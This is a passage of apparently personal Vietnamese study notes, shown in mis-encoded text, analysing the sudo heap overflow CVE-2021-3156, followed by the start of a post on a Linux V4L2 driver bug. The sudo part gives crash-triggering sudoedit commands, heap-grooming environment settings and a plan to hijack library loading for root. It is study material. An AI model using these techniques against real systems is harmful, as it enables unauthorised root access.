Ä‘á»ƒ Ä‘áº¿n vÃ¹ng code bá»‹ lá»—i), thÃ¬ MODE_SHELL Ä‘Æ°á»£c báº­t (dÃ²ng 571) vÃ  hÃ m parse_args() sáº½ thÃªm kÃ­ tá»± \\ vÃ o cÃ¡c kÃ­ tá»± Ä‘áº·c biá»‡t (meta-characters) bao gá»“m cáº£ \\ (nÃ³ sáº½ thay \\ thÃ nh \\\\) Tuy nhiÃªn, náº¿u quan sÃ¡t kÄ©, chÃºng ta sáº½ tháº¥y Ä‘iá»u kiá»‡n gá»i hÃ m cá»§a set_cmnd() vÃ  parse_args() cÃ³ má»™t chÃºt khÃ¡c biá»‡t: 1 2 3 819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { ... 858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { khÃ¡c vá»›i\n1 571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { CÃ¢u há»i Ä‘áº·t ra á»Ÿ Ä‘Ã¢y, liá»‡u ráº±ng ta cÃ³ thá»ƒ báº­t má»™t trong ba mode MODE_EDIT, MODE_CHECK, MODE_SHELL mÃ  khÃ´ng cáº§n pháº£i báº­t MODE_RUN - kÃ­ch hoáº·c escape code khÃ´ng? CÃ¢u tráº£ lá»i háº§u nhÆ° khÃ´ng thá»ƒ, bá»Ÿi vÃ¬: Náº¿u ta báº­t MODE_EDIT (tÃ¹y chá»n -e, dÃ²ng 361) hay MODE_CHECK (tÃ¹y chá»n -l, dÃ²ng 423 vÃ  519), thÃ¬ hÃ m parse_args() sáº½ xÃ³a MODE_SHELL tá»« valid_flags (dÃ²ng 363 vÃ  424), tráº£ vá» lá»—i náº¿u tÃ¬m tháº¥y invalid flag nhÆ° MODE_SHELL (dÃ²ng 532-533): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 358 case \u0026#39;e\u0026#39;: ... 361 mode = MODE_EDIT; 362 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; 363 valid_flags = MODE_NONINTERACTIVE; 364 break; ... 416 case \u0026#39;l\u0026#39;: ... 423 mode = MODE_LIST; 424 valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST; 425 break; ... 518 if (argc \u0026gt; 0 \u0026amp;\u0026amp; mode == MODE_LIST) 519 mode = MODE_CHECK; ... 532 if ((flags \u0026amp; valid_flags) != flags) 533 usage(1); May máº¯n thay, chÃºng váº«n tá»“n táº¡i má»™t sÆ¡ há»Ÿ: Náº¿u chÃºng ta thá»±c thi Sudo lÃ  sudoedit thay vÃ¬ sudo, parse_args() sáº½ tá»± Ä‘á»™ng báº­t MODE_EDIT (dÃ²ng 270) nhÆ°ng khÃ´ng xÃ³a cÃ¡c valid_flags, vÃ  MODE_SHELL láº¡i náº±m trong danh sÃ¡ch cÃ¡c valid_flags nÃ y (dÃ²ng 127 vÃ  249): 1 2 3 4 5 6 7 8 9 10 127 #define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) ... 249 int valid_flags = DEFAULT_VALID_FLAGS; ... 267 proglen = strlen(progname); 268 if (proglen \u0026gt; 4 \u0026amp;\u0026amp; strcmp(progname + proglen - 4, \u0026#34;edit\u0026#34;) == 0) { 269 progname = \u0026#34;sudoedit\u0026#34;; 270 mode = MODE_EDIT; 271 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; 272 } Viá»‡c nÃ y dáº«n Ä‘áº¿n: náº¿u chÃºng ta thá»±c thi sudoedit -s, sau Ä‘Ã³ báº­t MODE_EDIT vÃ  MODE_SHELL nhÆ°ng khÃ´ng báº­t MODE_RUN, chÃºng ta sáº½ trÃ¡nh Ä‘Æ°á»£c escape code vÃ  Ä‘i Ä‘áº¿n vÃ¹ng code bá»‹ lá»—i. Sau Ä‘Ã³, overflow heap-based buffer \u0026ldquo;user_args\u0026rdquo; thÃ´ng qua command-line argument mÃ  káº¿t thÃºc báº±ng dáº¥u backslash. 1 2 3 4 5 6 7 8 edisc@ubuntu:~$ sudo -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;` [sudo] password for edisc: Sorry, try again. [sudo] password for edisc: sudo: 1 incorrect password attempt edisc@ubuntu:~$ sudoedit -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;` Segmentation fault (core dumped) edisc@ubuntu:~$ DÆ°á»›i gÃ³c nhÃ¬n cá»§a káº» táº¥n cÃ´ng, buffer overflow trong trÆ°á»ng há»£p nÃ y khÃ¡ lÃ­ tÆ°á»Ÿng, bá»Ÿi vÃ¬: ChÃºng ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c kÃ­ch thÆ°á»›c cá»§a vÃ¹ng nhá»› mÃ  chÃºng ta overflow: user_args buffer (dÃ²ng 852-854) ChÃºng ta hoÃ n toÃ n Ä‘á»™c láº­p trong viá»‡c kiá»ƒm soÃ¡t kÃ­ch thÆ°á»›c vÃ  ná»™i dung cá»§a vÃ¹ng nhá»› bá»‹ overflow (dÃ²ng 852-853) ChÃºng ta tháº­m chÃ­ cÃ³ thá»ƒ viáº¿t null bytes vÃ o vÃ¹ng nhá»› bá»‹ overflow (tham sá»‘ hoáº·c biáº¿n mÃ´i trÆ°á»ng káº¿t thÃºc báº±ng \\ sáº½ viáº¿t 1 null byte vÃ o \u0026ldquo;user_args\u0026rdquo; dÃ²ng 866-868) VÃ­ dá»¥, trÃªn amd64 Linux, chÃºng ta cÃ³ thá»ƒ cáº¥p phÃ¡t 24 bytes trong user-args buffer (32-heap chunk) vÃ  ghi Ä‘Ã¨ nhá»¯ng field cá»§a chunk tiáº¿p theo vá»›i A=a\\0B=b\\0, ghi Ä‘Ã¨ trÆ°á»ng fd vá»›i C=c\\0D=d\\0 vÃ  trÆ°á»ng bk vá»›i E=e\\0F=f\\0: 1 2 3 4 5 6 7 8 ------------------------------------------------------------------------ env -i \u0026#39;AA=a\\\u0026#39; \u0026#39;B=b\\\u0026#39; \u0026#39;C=c\\\u0026#39; \u0026#39;D=d\\\u0026#39; \u0026#39;E=e\\\u0026#39; \u0026#39;F=f\u0026#39; sudoedit -s \u0026#39;1234567890123456789012\\\u0026#39; ------------------------------------------------------------------------ --|--------+--------+--------+--------|--------+--------+--------+--------+-- | | |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.| --|--------+--------+--------+--------|--------+--------+--------+--------+-- size \u0026lt;---- user_args buffer ----\u0026gt; size fd bk fd: forward\nbk: backward\nlÃ  hai con trá» trong cáº¥u trÃºc heap\rTrace Heap Usages Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng thá»±c thi cá»§a heap, chÃºng ta sáº½ trace heap usage trÃªn Ubuntu 18.04 tá»« malloc,realloc, calloc vÃ  hÃ m free vá»›i gdb script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 main() |- setlocale(LC_ALL, \u0026#34;\u0026#34;); |- tzset() |- sudo_conf_read_v1(CONF_DEBUG) | |- setlocale(\u0026#34;C\u0026#34;) // lÆ°u vá»‹ trÃ­ hiá»‡n táº¡i Ä‘áº§u tiÃªn | |- read /etc/sudo.conf | |- setlocale(prev_locale) // khÃ´i phá»¥c láº¡i locale |- sudo_conf_read_v1(CONF_ALL) / giá»‘ng vá»›i á»Ÿ trÃªn |- get_user_info() | |- getpwuid() | | |- parse /etc/nsswitch.conf and create service_user structs |- parse_args() |- sudo_load_plugins() | |- load sudoers.so | |- register env hooks |- policy_open() | |- format_plugin_settings() | | |- initialize sudo settings such as network_addrs (many mallocs) | |- sudoers_policy_init() | | |- init_defaults() | | | |- Nhiá»u chuá»—i ngáº¯n gá»i strdup() (ká»ƒ cáº£ def_timestampdir) | | | |- má»™t sá»‘ chuá»—i gá»i dcgettext Ä‘á»ƒ cáº¥p phÃ¡t. | | | |- init_envtables() // táº¡o ra nhiá»u malloc() nhá» | | |- init_vars() | | |- sudo_file_parse() load vÃ  parse /etc/sudoers |- policy_check() | |- sudoers_policy_main() | | |- set_cmnd() Luá»“ng thá»±c thi tá»« má»™t hÃ m xáº£y ra lá»—i yÃªu cáº§u password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 |- set_cmnd() // lá»— há»•ng á»Ÿ Ä‘Ã¢y |- setlocale(\u0026#34;C\u0026#34;) |- sudo_file_lookup() // tÃ¬m kiáº¿m dá»¯ liá»‡u Ä‘Æ°á»£c phÃ¢n tÃ­ch tá»« /etc/sudoers | |- nss_* | | |- nss_load_library() |- setlocale(user_locale) // khÃ´i phá»¥c láº¡i locale |- check_user() | |- check_user_interactive() | | |- táº¡o tá»‡p timestamp trong def_timestampdir | | |- yÃªu cáº§u máº­t kháº©u (náº¿u xÃ¡c thá»±c tháº¥t báº¡i, thoÃ¡t) | |- find_editer() | |- call sudoer_hook_env(\u0026#34;SUDO_EDITOR\u0026#34;) // chá»‰ Ä‘Æ°á»£c gá»i náº¿u xÃ¡c thá»±c thÃ nh cÃ´ng. Ä‘Ã£ cháº¡y gdbscript nhÆ°ng váº«n chÆ°a note láº¡i Ä‘á»ƒ kiá»ƒm tra xem cáº¥u trÃºc cÃ³ giá»‘ng vá»›i tÃ¡c giáº£ chÆ°a ÄÃ£ lÃ m Ä‘Æ°á»£c\rXÃ¡c Ä‘á»‹nh nhá»¯ng Ä‘á»‘i tÆ°á»£ng cÃ³ thá»ƒ bá»‹ overwriting Vá»›i luá»“ng thá»±c thi trÃªn, cÃ³ má»™t sá»‘ Ä‘á»‘i tÆ°á»£ng (objects) Ä‘Æ°á»£c cáº¥p phÃ¡t trÆ°á»›c khi chÃºng ta muá»‘n tiáº¿n hÃ nh heap overflow vÃ  Ä‘Æ°á»£c sá»­ dá»¥ng sau Ä‘Ã³ (lÃ­ tÆ°á»Ÿng cho viá»‡c ghi Ä‘Ã¨). nss service_user object def_timestampdir path compar function pointer in rbtree struct - Con trá» hÃ m cÃ³ thá»ƒ bá»‹ ghi Ä‘Ã¨ tá»«ng pháº§n Ä‘á»ƒ bypass ASLRS (dÃ¹ng má»™t Ä‘oáº¡n code bruteforcing), tuy nhiÃªn tham sá»‘ Ä‘áº§u tiÃªn láº¡i lÃ  chuá»—i rá»—ng. userspects object from parsing /etc/sudoers: cÃ³ kháº£ nÄƒng bypass xÃ¡c thá»±c trÃªn sudo cÃ³ phiÃªn báº£n \u0026gt;= 1.8.9 nhÆ°ng pháº£i lÃ m giáº£ nhiá»u Ä‘á»‘i tÆ°á»£ng (fake many objects). glibc heap with/without tcache Tá»« glibc phiÃªn báº£n 2.25, tcache Ä‘Æ°á»£c thÃªm vÃ o heap allocation. So sÃ¡nh giá»¯a tcache bins vÃ  fast bins: Giá»‘ng: Cáº£ 2 Ä‘á»u Ä‘Ã¡nh dáº¥u Ä‘Ã£ Ä‘Æ°á»£c sá»­ dá»¥ng. Äá»u lÃ  LIFO (Last In, First Out). CÃ³ thá»ƒ cáº¥p phÃ¡t láº¡i náº¿u kÃ­ch thÆ°á»›c yÃªu cáº§u cáº¥p phÃ¡t trÃ¹ng vá»›i kÃ­ch thÆ°á»›c cá»§a bin. KhÃ¡c: Max fast bÃ­n size lÃ  0x80, cÃ²n max tache bins size lÃ  0x410. Khi kÃ­ch thÆ°á»›c yÃªu cáº§u cáº¥p phÃ¡t lá»›n hÆ¡n small bins (0x400), táº¥t cáº£ cÃ¡c fast bins Ä‘Æ°á»£c Ä‘Æ°a vÃ o unsorted bins, sau Ä‘Ã³ chÃºng Ä‘Æ°á»£c táº­p há»£p láº¡i, Ä‘Æ°a vÃ o bin nhá» hÆ¡n hoáº·c lá»›n hÆ¡n. CÃ³ nhiá»u cáº¥p phÃ¡t yÃªu cáº§u khÃ­ch thÆ°á»›c lá»›n (nhÆ° file buffer trong glibc) trong cÃ¡c chÆ°Æ¡ng trÃ¬nh cháº¡y á»Ÿ quyá»n sudo. Vá»›i tache bÃ­n, large chunk dÆ°á»£c cáº¥p phÃ¡t sáº½ khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng trong tcahe bins. Nhá»¯ng free chunks vá»›i nhá»¯ng kÃ­ch thÆ°á»›c nháº¥t Ä‘á»‹nh sáº½ náº±m trong tache bin mÃ£i. Khai thÃ¡c glibc setlocale Khi hÃ m setlocale Ä‘Æ°á»£c gá»i vá»›i chuá»—i rá»—ng, nhá»¯ng biáº¿n mÃ´i trÆ°á»ng LC_* Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ° Ä‘áº§u vÃ o cho hÃ m _nl_find_locale: 1 2 3 4 5 6 7 8 9 10 11 12 13 115 if (cloc_name[0] == \u0026#39;\\0\u0026#39;) 116 { 117 /* The user decides which locale to use by setting environment 118 variables*/ 119 cloc_name = getenv(\u0026#34;LC_ALL\u0026#34;); 120 if (!name_present(cloc_name)) 121 cloc_name = getenv(_nl_category_name.str 122 + _nl_category_name_idxs[category]); 123 if (!name_present(cloc_name)) 124 cloc_name = getenv(\u0026#34;LANG\u0026#34;); 125 if (!name_present(cloc_name)) 126 cloc_name = _nl_C_name; 127 } Äoáº¡n code trÃªn, ta tháº¥y Æ°u tiÃªn cho viá»‡c láº¥y locale name cho má»—i danh má»¥c lÃ  LC_ALL, LC_\u0026lt;CATEGORY_NAME\u0026gt;, LANG environment. Náº¿u khÃ´ng cÃ³ gÃ¬ Ä‘Æ°á»£c thiáº¿t láº­p, special locale name \u0026quot;C\u0026quot; Ä‘Æ°á»£c sá»­ dá»¥ng. Náº¿u locale name lÃ  \u0026ldquo;C\u0026rdquo;, hÃ m _nl_find_locale sáº½ tráº£ vá» ngay láº­p tá»©c mÃ  khÃ´ng Ä‘i tá»›i heap, vá»›i nhá»¯ng tÃªn khÃ¡c, flow sáº½ nhÆ° sau: 1 2 3 4 5 6 7 8 9 10 11 185 /*LOCALE can consist of up to four recognized parts for the XPG syntax: 186 language[_territory[.codeset]][@modifier] 187 188 Beside the first all of them are allowed to be missing. If the full specified locale is not found, the less specific one are looked for. The various part will be stripped off according to the following order: 189 (1) codeset 190 (2) normalized codeset 191 (3) territory 192 (4) modifier */ mask = _nl_explode_name (loc_name, \u0026amp;language, \u0026amp;modifier, \u0026amp;territory, \u0026amp;codeset, \u0026amp;normalized_codeset); GiÃ¡ trá»‹ tráº£ vá» mark lÃ  cá» Ä‘á»ƒ chá»‰ ra sá»± tá»“n táº¡i cá»§a cÃ¡c pháº§n nÃ y trong locale name Ä‘Æ°á»£c nháº­n. Sau Ä‘Ã³ hÃ m _nl_make_l10nflist Ä‘Æ°á»£c gá»i Ä‘á»ƒ kiá»ƒm tra liá»‡u locale name Ä‘Ã£ nháº­n cÃ³ Ä‘Æ°á»£c táº£i lÃªn hay chÆ°a? Äiá»u nÃ y yÃªu cáº§u malloc Ä‘á»ƒ lÆ°u Ä‘áº§y Ä‘á»§ tÃªn thÆ° má»¥c. Náº¿u nÃ³ náº±m trong danh sÃ¡ch/lá»‡nh gá»i chá»‰ Ä‘á»ƒ nháº­n, giáº£i phÃ³ng nÃ³ rá»“i tráº£ vá».\n1 2 3 4 5 6 7 8 9 10 11 12 165 /*Allocate room for the full file name. */ 166 abs_filename = (char *) malloc(dirlist_len 167 + strlen(language) 168 + ((mask \u0026amp; XPG_TERRITORY) != 0 169 ? strlen (codeset) + 1 : 0) 170 + ((mask \u0026amp; XPG_CODESET) != 0 171 ? strlen(normalized_codeset) + 1 : 0) 172 + ((mask \u0026amp; XPG_NORM_CODESET) != 0 173 ? strlen(normalized_codeset) + 1 : 0) 174 + ((mask \u0026amp; XPG_MODIFIER) != 0 175 ? strlen(modifier) + 1 : 0) 176 + 1 + strlen(filename) +1); Náº¿u locale name khÃ´ng náº±m trong danh sÃ¡ch Ä‘Æ°á»£c load, hÃ m _nl_make_l10nflist Ä‘Æ°á»£c gá»i má»™t láº§n ná»¯a Ä‘á»ƒ táº¡o ra táº¥t cáº£ cÃ¡c Ä‘Æ°á»ng dáº«n cÃ³ thá»ƒ (Ä‘Æ°á»ng dáº«n cÆ¡ báº£n lÃ  /usr/lib/locale) tá»« viá»‡c káº¿t há»£p nhá»¯ng thÃ nh pháº§n vÃ  Ä‘áº·c tÃ­nh cá»§a tÃªn báº±ng gá»i Ä‘á»‡ quy chÃ­nh Ä‘Ã³ vá»›i \u0026ldquo;mask\u0026rdquo; Ä‘Ã£ Ä‘Æ°á»£c sá»­a Ä‘á»•i. Thuáº­t toÃ¡n nÃ y sáº½ táº¡o ra má»™t duplicated part (malloc) vÃ  rá»“i xÃ³a nÃ³ (free) sau khi kiá»ƒm tra xong. CÃ ng nhiá»u thÃ nh pháº§n trong locales thÃ¬ sáº½ cÃ³ cÃ ng nhiá»u hÃ m malloc vÃ  free Ä‘Æ°á»£c gá»i. Sau Ä‘Ã³, hÃ m _nl_find_locale cá»‘ gáº¯ng load locale data tá»« tá»«ng Ä‘Æ°á»ng dáº«n má»™t. Náº¿u tÃ¬m tháº¥y má»™t locale data há»£p lá»‡, hÃ m setlocale sáº½ sawpx xáº¿p tÃªn miá»n nháº¥t Ä‘á»‹nh vÃ  lÆ°u nÃ³ trong ná»™i bá»™. Náº¿u cÃ³ lá»—i xáº£y ra, hÃ m setlocale sáº½ giáº£i phÃ³ng táº¥t cáº£ cÃ¡c tÃªn Ä‘Ã£ Ä‘Æ°á»£c lÆ°u vÃ  máº·c Ä‘á»‹nh sá»­ dá»¥ng C rá»“i tráº£ vá» ngay lÃ¢p tá»©c. Do Ä‘Ã³, locale name khÃ´ng thá»ƒ ngáº«u nhiÃªn, Ã­t nháº¥t ngÃ´n ngá»¯ vÃ  bá»™ mÃ£ pháº£i há»£p lá»‡. Sau khi táº¥t cáº£ tÃªn danh má»¥c Ä‘á»u Ä‘Æ°á»£c strdup() vÃ  dá»¯ liá»‡u Ä‘Æ°á»£c load, LC_ALL sáº½ Ä‘Æ°á»£c táº¡o trong hÃ m new_composite_name. Náº¿u táº¥t cáº£ cÃ¡c tÃªn LC giá»‘ng nhau, giÃ¡ trá»‹ cá»§a nÃ³ sáº½ chá»‰ Ä‘Æ°á»£c láº¥y tá»« tÃªn Ä‘áº§u tiÃªn, ngÆ°á»£c láº¡i, náº¿u khÃ´ng giá»‘ng, giÃ¡ trá»‹ sáº½ Ä‘Æ°á»£c káº¿t há»£p láº¡i vá»›i nhau. Kiá»ƒm soÃ¡t heap usage báº±ng biáº¿n mÃ´i trÆ°á»ng. Má»™t sá»‘ giÃ¡ trá»‹ cá»§a biáº¿n mÃ´i trÆ°á»ng giÃºp cho viá»‡c khai thÃ¡c lá»—i nÃ y:\nThiáº¿t láº­p mÃ´i trÆ°á»ng \u0026quot;TZ=:\u0026quot;: giáº£m sá»‘ láº§n sá»­ dá»¥ng heap trong hÃ m glibc tzset() vÃ  hoÃ n toÃ n cÃ³ thá»ƒ tiÃªn Ä‘oÃ¡n trÆ°á»›c. ThÃªm \u0026quot;;x=x\u0026quot; trong má»i biáº¿n mÃ´i trÆ°á»ng LC, luá»“ng thá»±c thi sáº½ nhÆ° sau: Äáº§u tiÃªn, hÃ m setlocale(\u0026quot;\u0026quot;) sáº½ cáº¥p phÃ¡t vÃ  giáº£i phÃ³ng má»™t cÃ¡ch bÃ¬nh thÆ°á»ng, LC_ALL sáº½ cÃ³ giÃ¡ trá»‹ \u0026quot;...;x=x;...\u0026quot; Sau Ä‘Ã³, setlocale(NULL) láº¥y giÃ¡ trá»‹ LC_ALL hiá»‡n táº¡i vÃ  lÆ°u láº¡i. setlocale(\u0026quot;C\u0026quot;) sáº½ giáº£i phÃ³ng táº¥t cáº£ locale name nháº­n Ä‘Æ°á»£c. setlocale(saved_LC_ALL) sáº½ khÃ´ng lÃ m gÃ¬, vÃ¬ x lÃ  tÃªn danh má»¥c khÃ´ng há»£p lá»‡. Tá»›i Ä‘Ã¢y, LC_ALL trong glibc lÃ  \u0026ldquo;C\u0026rdquo; setlocale sáº½ khÃ´ng lÃ m gÃ¬ bá»Ÿi vÃ¬ LC_ALL lÃ  C Káº¿t quáº£ chÃºng ta sáº½ cÃ³ má»™t vÃ¹ng Ä‘Æ°á»£c giáº£i phÃ³ng vá»›i kÃ­ch thÆ°á»›c Ä‘Æ°á»£c kiá»ƒm soÃ¡t báº±ng cÃ¡ch thiáº¿t láº­p mÃ´i trÆ°á»ng LC Cáº¥u trÃºc service_user 1 2 3 4 5 6 7 8 9 10 11 12 13 typedef struct service_user { /* And the link to the next entry. */ struct service_user *next; /* Action according to result. */ lookup_actions actions[5]; /* Link to the underlying library object. */ service_library *library; /* Collection of known functions. */ void *known; /* Name of the service (`files\u0026#39;, `dns\u0026#39;, `nis\u0026#39;, ...). */ char name[0]; } service_user; -Cáº¥u trÃºc nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng trong nss_load_library cá»§a libc khÃ¡ thÆ°á»ng xuyÃªn khi váº¥n Ä‘á» overflow xáº£y ra (trace log) Ä‘á»ƒ load nhá»¯ng thÆ° viá»‡n liÃªn káº¿t Ä‘á»™ng lÃªn. ChÃºng ta cÃ³ thá»ƒ ghi Ä‘Ã¨ trÆ°á»ng name vÃ  táº£i thÆ° viá»‡n cá»§a chÃºng ta lÃªn.\nSau Ä‘Ã³, chÃºng ta nháº¯m tá»›i nhá»¯ng thÆ° viá»‡n mÃ  khÃ´ng cÃ³ Ä‘áº·c quyá»n, cháº¡y nÃ³ vá»›i quyá»n root. HÃ m nhÆ° sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static int nss_load_library (service_user *ni) { if (ni-\u0026gt;library == NULL) { static name_database default_table; ni-\u0026gt;library = nss_new_service (service_table ?: \u0026amp;default_table, ni-\u0026gt;name); if (ni-\u0026gt;library == NULL) return -1; } if (ni-\u0026gt;library-\u0026gt;lib_handle == NULL) { /* Load the shared library. */ size_t shlen = (7 + strlen (ni-\u0026gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, \u0026#34;libnss_\u0026#34;), ni-\u0026gt;name), \u0026#34;.so\u0026#34;), __nss_shlib_revision); ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen (shlib_name); Má»¥c tiÃªu cá»§a hÃ m nÃ y lÃ  Ä‘áº¿n ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen(shlib_name) Ä‘á»ƒ táº£i thÆ° viá»‡n mÃ  chÃºng ta kiá»ƒm soÃ¡t. CÃ³ hai Ä‘iá»u mÃ  chÃºng ta cáº§n lÆ°u Ã½: Náº¿u ni-\u0026gt;library khÃ¡c NULL, chÃºng ta sáº½ sá»­ dá»¥ng con trá» trong ni-\u0026gt;library-\u0026gt;lib_handle vÃ  vÃ¬ ASLR nÃªn chÃºng ta khÃ´ng thá»ƒ Ä‘oÃ¡n liá»‡u ráº±ng con trá» nÃ y cÃ³ há»£p lá»‡ hay khÃ´ng. ChÃºng ta thiáº¿t láº­p ni-\u0026gt;library=nss_new_service(...) náº¿u con trá» nÃ y NULL, sau Ä‘Ã³ chÃºng ta chá»‰ cáº§n ghi Ä‘Ã¨ cáº¥u trÃºc nÃ y Ä‘á»ƒ láº¥y Ä‘Æ°á»£c tÃªn trÆ°á»ng vÃ  Ä‘á»•i nÃ³ tá»›i nhá»¯ng thÆ° viá»‡n mÃ  chÃºng ta kiá»ƒm soÃ¡t. ThÃ¡ch thá»©c thá»© 2 lÃ  chÃºng ta cÃ³ con trá» struct service_user *next. Náº¿u chÃºng ta gÃ¢y ra overflow Ghi Ä‘Ã¨ cáº¥u trÃºc service_user báº±ng glibc tcache Tá»« trace log, chÃºng ta tháº¥y 2 lá»‡nh gá»i nss_load_library. Sau Ä‘Ã³ ta kiá»ƒm tra xem service_user object Ä‘Æ°á»£c táº¡o á»Ÿ vá»‹ trÃ­ nÃ o\nNÃ³ Ä‘Æ°á»£c táº¡o tá»« \u0026ldquo;nhÃ³m\u0026rdquo; cÃ¡c dÃ²ng trong file \u0026ldquo;nsswitch.conf\u0026rdquo;. NhÆ° chÃºng ta tháº¥y, sudo sáº½ táº¡o ra service_user objects (tá»« 2 dá»‹ch vá»¥ trong passwd line). Do Ä‘Ã³, mÃ£ thá»±c thi cá»§a chÃºng ta sáº½ Ä‘á»c file nsswitch.conf Ä‘áº» xÃ¡c Ä‘á»‹nh offset hoáº·c sá»‘ lÆ°á»£ng chunk size = 0x40 Ä‘Æ°á»£c táº¡o. Thiáº¿t láº­p TZ=: vÃ  ;x=x trong mÃ´i trÆ°á»ng LC sáº½ giÃºp chÃºng ta Ä‘iá»u khiá»ƒn viá»‡c sá»­ dá»¥ng heap trÆ°á»›c khi phÃ¢n tÃ­ch file \u0026quot;/etc/nsswitch.conf\u0026quot; Trace hÃ m malloc/free tá»« lá»‡nh gá»i hÃ m sudo_conf_read_v1 tá»›i lá»‡nh get_user_info ta sáº½ Ä‘Æ°á»£c nhÆ° dÆ°á»›i\nlÃ m sao Ä‘á»ƒ trace Ä‘Æ°á»£c nhÆ° tÃ¡c giáº£\rVÃ­ dá»¥, ta thiáº¿t láº­p mÃ´i trÆ°á»ng \u0026quot;LC_CTYPE=C.UTF-8@\u0026quot; + \u0026quot;A\u0026quot;*0x28 vÃ  \u0026quot;LC_NUMERIC=C.UTF-8@\u0026quot;+\u0026quot;A\u0026quot;*0x86. Chunk size cá»§a LC_CTYPE lÃ  0x30+8 (8 lÃ  kÃ­ch thÆ°á»›c cá»§a heap metadata), sau Ä‘Ã³ Ä‘Æ°á»£c lÃ m trÃ²n lÃªn 0x40 vÃ  chunk size cá»§a LC_NUMERIC lÃ  0x80. Rá»“i chÃºng ta sáº½ Ä‘Æ°á»£c bá»‘ cá»¥c tÆ°á»£ng tá»± nhÆ° hÃ¬nh bÃªn cho nsswitch.conf vá»›i 2 dá»‹ch vá»¥ cho passwd. 1 2 3 4 LC_COLLATE LC_TIME LC_NUMERIC LC_CTYPE --+-------------+----+------------+---+-------------+---+-------------+--- | free 0x40 | .. | free 0x40 |...| free 0x80 |...| freed 0x40 | --+-------------+----+------------+---+-------------+---+-------------+--- Do Ä‘Ã³, sáº½ hÆ°á»›ng Ä‘áº¿n servirce_user object táº¡i vÃ¹ng nhá»› LC_CTYPE bá»‹ giáº£i phÃ³ng vÃ  thá»±c hiá»‡n heap overflow táº¡i LC_NUMERIC Ä‘á»ƒ ghi Ä‘Ã¨ service_user object\n","description":"Lá»—i cho phÃ©p ngÆ°á»i dÃ¹ng bÃ¬nh thÆ°á»ng láº¥y Ä‘Æ°á»£c root mÃ  khÃ´ng cáº§n biáº¿t máº­t kháº©u cá»§a root","id":13,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"TÃ¬m hiá»ƒu vá» CVE-2021â€“3156 (A Sudo vulnerability)","uri":"https://minhlongmt183.github.io/posts/cve-2021-3156/"},{"content":"\rBÃ i viáº¿t nÃ y nháº±m má»¥c Ä‘Ã­ch ghi láº¡i nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ há»c Ä‘á»ƒ nhá»› vÃ  hiá»ƒu rÃµ hÆ¡n. BÃ i viáº¿t tham kháº£o chá»§ yáº¿u tá»« CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem\rVulnerabilities chÃºng ta táº£i source code kernel vá» vÃ  xem táº¡i: linux-x/drivers/media/platform/vivid/\rLá»— há»•ng báº¯t nguá»“n tá»« sai sÃ³t trong hiá»‡n thá»±c, sá»­ dá»¥ng mutex lock cá»§a driver vivid trong subsystem V4L2 - (drivers/media/platform/vivid). Driver nÃ y khÃ´ng yÃªu cáº§u báº¥t cá»© pháº§n cá»©ng Ä‘áº·c biá»‡t nÃ o. NÃ³ Ä‘Ã³ng vai trÃ² nhÆ° má»™t kernel module (CONFIG_VIDEO_VIVID=m) trong cÃ¡c há»‡ Ä‘iá»u hÃ nh nhÆ°: Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise, and openSUSE. Driver vivid mÃ´ phá»ng pháº§n cá»©ng video4linux cá»§a nhiá»u loáº¡i: video capture, video output, radio receivers and transmitters and a software defined radio receivers. Nhá»¯ng input vÃ  output sáº½ hoáº¡t Ä‘á»™ng giá»‘ng nhÆ° nhá»¯ng thiáº¿t bá»‹ váº­t lÃ­ tháº­t, do Ä‘Ã³, nÃ³ cho phÃ©p á»©ng dá»¥ng thá»±c hiá»‡n mÃ  khÃ´ng cáº§n báº¥t cá»© thiáº¿t bá»‹ pháº§n cá»©ng Ä‘áº·c biá»‡t nÃ o. TrÃªn Ubuntu, nhá»¯ng thiáº¿t bá»‹ Ä‘Æ°á»£c táº¡o bá»Ÿi driver vivid Ä‘á»u hoáº¡t Ä‘á»™ng cho ngÆ°á»i dÃ¹ng bÃ¬nh thÆ°á»ng, vÃ¬ ubuntu sá»­ dá»¥ng RW USAL khi ngÆ°á»i dÃ¹ng Ä‘Äƒng nháº­p open, read vÃ  close trong vivid open HÃ m nÃ y thÃ¬ khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t vá»›i trÆ°á»ng há»£p lá»—i nÃ y, nÃ³ chá»‰ Ä‘Æ¡n giáº£n Ä‘Æ°á»£c gá»i Ä‘á»ƒ báº­t thiáº¿t bá»‹\nread ChÃºng ta cÃ¹ng theo flow cá»§a lá»‡nh read nÃ y\nstateDiagram\rread --\u0026gt; vfd_read\rvfd_read 